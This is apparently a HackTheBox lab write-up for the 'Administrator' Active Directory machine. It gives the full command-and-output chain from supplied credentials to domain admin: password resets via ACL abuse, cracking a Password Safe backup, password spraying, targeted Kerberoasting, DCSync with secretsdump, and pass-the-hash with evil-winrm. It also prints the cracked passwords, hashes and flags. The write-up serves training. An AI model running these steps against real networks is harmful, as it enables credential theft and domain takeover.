---
title: "Administrator"
date: 2025-06-20
categories:
  - HackTheBox
  - Active Directory
tags:
  - HackTheBox
  - Active Directory
---

# Administrator

![](../assets/Pasted%20image%2020250614143057.png)
<!-- more -->

## Machine Information

As is common in real-life Windows pentests, you will start the `Administrator` box with credentials for the following account: `Olivia`:`ichliebedich`

## Enumeration

```shell
$ nmap -A -T4 --min-rate 5000 -p- -n -Pn --open 10.10.11.42
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-14 14:31 CEST
Nmap scan report for 10.10.11.42
Host is up (0.041s latency).
Not shown: 64837 closed tcp ports (reset), 672 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
53/tcp    open  domain        (generic dns response: SERVFAIL)
| fingerprint-strings: 
|   DNS-SD-TCP: 
|     _services
|     _dns-sd
|     _udp
|_    local
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-06-14 19:31:33Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
59383/tcp open  msrpc         Microsoft Windows RPC
60509/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
60514/tcp open  msrpc         Microsoft Windows RPC
60521/tcp open  msrpc         Microsoft Windows RPC
60526/tcp open  msrpc         Microsoft Windows RPC
60539/tcp open  msrpc         Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.95%I=7%D=6/14%Time=684D6BB4%P=x86_64-pc-linux-gnu%r(DNS-
SF:SD-TCP,30,"\0\.\0\0\x80\x82\0\x01\0\0\0\0\0\0\t_services\x07_dns-sd\x04
SF:_udp\x05local\0\0\x0c\0\x01");
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
```

Checking the provided credentials, we have access via `winrm`.

![](../assets/Pasted%20image%2020250614153116.png)

Add `administrator.htb` to `/etc/hosts`.

Get the domain data with `bloodhound-ce-python`:

```shell
$ bloodhound-ce-python -c All -u olivia -p ichliebedich -d administrator.htb -dc administrator.htb -ns 10.10.11.42 --zip
INFO: BloodHound.py for BloodHound Community Edition
INFO: Found AD domain: administrator.htb
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
INFO: Connecting to LDAP server: administrator.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: administrator.htb
INFO: Found 11 users
INFO: Found 53 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: dc.administrator.htb
INFO: Done in 00M 08S
INFO: Compressing output into 20250614153205_bloodhound.zip
```

Upload the data to [`BloodHound`](https://github.com/BloodHoundAD/BloodHound).

![](../assets/Pasted%20image%2020250614155612.png)

`Olivia` has `GenericAll` over `michael`, so we can change his password.

```shell
$ net rpc password "michael" "newP@ssword2022" -U "administrator"/"olivia"%"ichliebedich" -S "10.10.11.42"             10.10.11.42     445    DC               [+] administrator.htb\michael:newP@ssword2022
```

Now `michael` has `ForceChangePassword` over `benjamin`.

![](../assets/Pasted%20image%2020250614160234.png)

```shell
$ net rpc password "benjamin" "newP@ssword2022" -U "administrator"/"michael"%"newP@ssword2022" -S "10.10.11.42"
```

Log into the `ftp` with `benjamin` and get `Backup.psafe3`.

![](../assets/Pasted%20image%2020250614160642.png)

Using `pwsafe2john` and `john`, crack the password.

```shell
$ pwsafe2john Backup.psafe3 > hash
```

![](../assets/Pasted%20image%2020250614160932.png)

Using the command `pwsafe`, open the backup file and enter the password.

![](../assets/Pasted%20image%2020250614161119.png)

Get each password and put it in a `passwords` file to spray them.

![](../assets/Pasted%20image%2020250614161234.png)

Make a users list too.

```shell
$ rpcclient -U 'olivia%ichliebedich'  //10.10.11.42 -c enumdomusers | awk -F[][] '{print $2}' > users
```

With `nxc`, check all combinations.

![](../assets/Pasted%20image%2020250614161418.png)

`emily`:`UXLCI5iETUsIBoFVTj8yQFKoHjXmb`

`Emily` has `GenericWrite` over `ethan`.

![](../assets/Pasted%20image%2020250614161517.png)

And `ethan` can `DCSync` the domain.

![](../assets/Pasted%20image%2020250614161603.png)

So we can perform a targeted Kerberoast on `ethan`.

```shell
$ python targetedKerberoast/targetedKerberoast.py -d administrator.htb -u emily -p UXLCI5iETUsIBoFVTj8yQFKoHjXmb --request-user ethan
[*] Starting kerberoast attacks
[*] Attacking user (ethan)
[+] Printing hash for (ethan)
$krb5tgs$23$*ethan$ADMINISTRATOR.HTB$administrator.htb/ethan*$5924e375c523e6d982e8be22da4d4149$833bb3618f58915c0f55ed4937e33485a2d4414708e2b5a487647814ef78c74e354b190c6286ef6d3b00a2cdc9153835263ba93b554e1679f731a2f40495b8ebaf8cbd48a668e2acab673047f9f8740b2af9c58d0232ae6cd17822675734fd52e3ea3c10106a4846768ee8d57b4be9e8a47cb6d1cf586dc35cda4c5d595f5f06c76ae64181d38ceb53b91d5019db5331b34bded3078cfc964cf905d745ed4cb143ea6255685d8e728936f7a3ba309a084589d4ae4d230382024410997e0cc52b24bdd9aeb57f7d24d936761902b51ccf4f1bba985deba5f12ae2654f7d90be86078886a5f2933aaf7f2e21131757b2e0653c9272b960393fc0f1f053d84f9810b675d070ddaf7a662e73c1eb04bc39df22f20cd8041fdfebadeb241a275d39013f7dcdb8b67fec87ae83d7e3292e30c177be799ace015d6e7f23699d35494ef3e62aaa47314bc721111fd6bccd206400fc9d8cd5f0a2337512ae0de9ccf014357d0619bfdc402885112e9f611bb39b19ebb27490107c828ca90269618461942ebebe69f7c5b9eb81bfa253602777db0195d11f3c1001bf8eed33fad8e1cb4dd967eec4aa6907918ff69d3aa343afc6a7571245c00ff3d865bdcbb20f4723543f90ec0e41858bed5953795e09c95c9d81f40e2d55e16d9da686a3bd325dd1c584e899658759d18c1c97a1cbc92dbb071ee1b534faf3416d699b0e55c3f81ec0cb9379921a14a9179ac1412d262475ed39b0747bfbd8c87162fc2db4f05e8e8f29825aff554faafccf616a7a5d81c1092de257be186fbaf2a8d76c0a48e0504788ecff37e01f7cae79423853bc0a490a37a94c6ac235c6c60e1afd3df6b0d84b806893abf0a06cfe3a9c583f164ba9e21c39e36c48127effe578e4bee41517ed459fec61a5a044c9a9a934a8fd3dc30ba4b58645dfd8a9409c24e2909f319375ab3caac4b70a40ecc87c323a60cec1d0a337d2b779e731f10a24608cc54833d307c9ff3706b27d91e7d4b0e5d92b59fe31e860d06ecfffe002bb97d3637e79e1da7a6788d9255fb4d93c2045e0ec445148c4eac0e4a86164dfbd6bb19992f62e4bab1733f6df81046b413c7acd4e4914d8d70291c1476fa4c0222e2c710b7b4e9cfc605c27027eaa186eb2ef52657b781f95aa2cc89eb6c8b29018257f958498fd2925369d0ad6fe5ed767cc7fe03bbdec69a7d7eccaa7fcd4b463f6a88cb1c30b61dd4ed148325e51e1b630a794a5e925a239d0d460726fefe06f8b8bb5289231d21c3fd52bc81ae5203da74be6a743750e679079b4519da3c6bed15afe2cb6d077b8bd455e85c5d7ccb436820098a8f8d9dca683ec4b79b0a94906641a861c31780513654edfea42119345d12cf271a286473114766408e1a40492e9afda844d22b28dc3f4edfee79d56e12f291e29dab49cef3f1e77306a0d172bc58bcf46fa126421f2b15d47536b4c9c968d96dd2b480d2405b02a401f67addc0209fedc80048a1be5283cd56a229fcdc2c6f35d5b6b62ded790b8a9a440d9746f24ee47:limpbizkit
...

```

And using `hashcat`, crack it.

```shell
$ hashcat -m 13100 hash /usr/share/seclists/Passwords/xato-net-10-million-passwords.txt --force 
hashcat (v6.2.6) starting

...

$krb5tgs$23$*ethan$ADMINISTRATOR.HTB$administrator.htb/ethan*$5924e375c523e6d982e8be22da4d4149$833bb3618f58915c0f55ed4937e33485a2d4414708e2b5a487647814ef78c74e354b190c6286ef6d3b00a2cdc9153835263ba93b554e1679f731a2f40495b8ebaf8cbd48a668e2acab673047f9f8740b2af9c58d0232ae6cd17822675734fd52e3ea3c10106a4846768ee8d57b4be9e8a47cb6d1cf586dc35cda4c5d595f5f06c76ae64181d38ceb53b91d5019db5331b34bded3078cfc964cf905d745ed4cb143ea6255685d8e728936f7a3ba309a084589d4ae4d230382024410997e0cc52b24bdd9aeb57f7d24d936761902b51ccf4f1bba985deba5f12ae2654f7d90be86078886a5f2933aaf7f2e21131757b2e0653c9272b960393fc0f1f053d84f9810b675d070ddaf7a662e73c1eb04bc39df22f20cd8041fdfebadeb241a275d39013f7dcdb8b67fec87ae83d7e3292e30c177be799ace015d6e7f23699d35494ef3e62aaa47314bc721111fd6bccd206400fc9d8cd5f0a2337512ae0de9ccf014357d0619bfdc402885112e9f611bb39b19ebb27490107c828ca90269618461942ebebe69f7c5b9eb81bfa253602777db0195d11f3c1001bf8eed33fad8e1cb4dd967eec4aa6907918ff69d3aa343afc6a7571245c00ff3d865bdcbb20f4723543f90ec0e41858bed5953795e09c95c9d81f40e2d55e16d9da686a3bd325dd1c584e899658759d18c1c97a1cbc92dbb071ee1b534faf3416d699b0e55c3f81ec0cb9379921a14a9179ac1412d262475ed39b0747bfbd8c87162fc2db4f05e8e8f29825aff554faafccf616a7a5d81c1092de257be186fbaf2a8d76c0a48e0504788ecff37e01f7cae79423853bc0a490a37a94c6ac235c6c60e1afd3df6b0d84b806893abf0a06cfe3a9c583f164ba9e21c39e36c48127effe578e4bee41517ed459fec61a5a044c9a9a934a8fd3dc30ba4b58645dfd8a9409c24e2909f319375ab3caac4b70a40ecc87c323a60cec1d0a337d2b779e731f10a24608cc54833d307c9ff3706b27d91e7d4b0e5d92b59fe31e860d06ecfffe002bb97d3637e79e1da7a6788d9255fb4d93c2045e0ec445148c4eac0e4a86164dfbd6bb19992f62e4bab1733f6df81046b413c7acd4e4914d8d70291c1476fa4c0222e2c710b7b4e9cfc605c27027eaa186eb2ef52657b781f95aa2cc89eb6c8b29018257f958498fd2925369d0ad6fe5ed767cc7fe03bbdec69a7d7eccaa7fcd4b463f6a88cb1c30b61dd4ed148325e51e1b630a794a5e925a239d0d460726fefe06f8b8bb5289231d21c3fd52bc81ae5203da74be6a743750e679079b4519da3c6bed15afe2cb6d077b8bd455e85c5d7ccb436820098a8f8d9dca683ec4b79b0a94906641a861c31780513654edfea42119345d12cf271a286473114766408e1a40492e9afda844d22b28dc3f4edfee79d56e12f291e29dab49cef3f1e77306a0d172bc58bcf46fa126421f2b15d47536b4c9c968d96dd2b480d2405b02a401f67addc0209fedc80048a1be5283cd56a229fcdc2c6f35d5b6b62ded790b8a9a440d9746f24ee47:limpbizkit
...

```

`ethan:limpbizkit`

`Ethan` has `DCSync` over the domain, therefore we can use `secretsdump` to get the `admin`'s hash.

```shell
$ impacket-secretsdump -just-dc-user administrator administrator/ethan:limpbizkit@10.10.11.42
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:3dc553ce4b9fd20bd016e098d2d2fd2e:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:9d453509ca9b7bec02ea8c2161d2d340fd94bf30cc7e52cb94853a04e9e69664
Administrator:aes128-cts-hmac-sha1-96:08b0633a8dd5f1d6cbea29014caea5a2
Administrator:des-cbc-md5:403286f7cdf18385
[*] Cleaning up... 
```

Enter with PTH as `admin`.

```shell
$ evil-winrm -i 10.10.11.42 -u administrator -H 3dc553ce4b9fd20bd016e098d2d2fd2e

Evil-WinRM shell v3.7

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
administrator\administrator
```

## Post Exploitation

Get the hashes.

```shell
*Evil-WinRM* PS C:\Users\Administrator\desktop> type root.txt
77db7e094328dedcbc8a140eedf5093f
```

```shell
*Evil-WinRM* PS C:\Users> type emily\desktop\user.txt
e2a5ed81bf8e3c152ddb3605402bb30e
```
